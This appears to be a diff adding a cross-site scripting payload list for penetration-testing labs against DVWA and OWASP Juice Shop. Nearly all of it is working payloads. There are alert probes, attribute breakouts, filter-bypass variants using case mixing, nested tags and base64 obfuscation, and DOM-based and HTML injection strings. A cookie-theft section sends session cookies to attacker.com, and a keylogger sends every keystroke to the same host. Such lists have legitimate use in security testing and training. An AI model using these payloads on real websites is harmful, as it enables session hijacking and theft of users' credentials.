@@ -1,0 +1,62 @@
+# XSS Payloads — VAPT Lab
+# Used in testing DVWA and OWASP Juice Shop
+# FOR EDUCATIONAL USE IN LAB ENVIRONMENTS ONLY
+
+# ========================================
+# BASIC ALERTS (Testing)
+# ========================================
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# ========================================
+# ATTRIBUTE-BASED
+# ========================================
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><body onload=alert(1)>
+
+# ========================================
+# FILTER BYPASS
+# ========================================
+<ScRiPt>alert(1)</ScRiPt>
+<script >alert(1)</script >
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# ========================================
+# COOKIE THEFT
+# ========================================
+<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
+<img src=x onerror="fetch('http://attacker.com/?c='+encodeURIComponent(document.cookie))">
+<script>new Image().src='http://attacker.com/log?cookie='+document.cookie</script>
+
+# ========================================
+# KEYLOGGER
+# ========================================
+<script>
+document.onkeypress = function(e) {
+    fetch('http://attacker.com/log?key='+e.key);
+}
+</script>
+
+# ========================================
+# DOM-BASED
+# ========================================
+#<script>alert(1)</script>
+javascript:void(document.write('<script>alert(1)<\/script>'))
+<img src="javascript:alert(1)">
+
+# ========================================
+# HTML INJECTION
+# ========================================
+<h1>Injected Header</h1>
+<b>Bold Injection</b>
+<a href="http://evil.com">Click here for prize!</a>
